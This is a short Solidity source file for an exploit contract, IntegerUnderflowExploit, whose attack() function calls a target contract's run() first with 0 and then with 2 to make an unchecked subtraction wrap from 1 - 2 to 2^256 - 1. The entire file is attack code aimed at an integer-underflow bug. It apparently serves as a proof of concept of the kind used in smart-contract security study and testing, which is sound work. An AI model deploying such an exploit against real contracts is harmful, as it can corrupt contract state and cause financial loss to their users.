pragma solidity ^0.4.23;

interface IVulnerable {
    function run(uint256 input) external;
}

contract IntegerUnderflowExploit {
    IVulnerable public vulnerable;

    constructor(address _vulnerable) public {
        vulnerable = IVulnerable(_vulnerable);
    }

    function attack() public {
        // Step 1: Call to initialize
        vulnerable.run(0); // sets initialized = 1

        // Step 2: Cause underflow (1 - 2 = 2^256 - 1)
        vulnerable.run(2);
    }
}

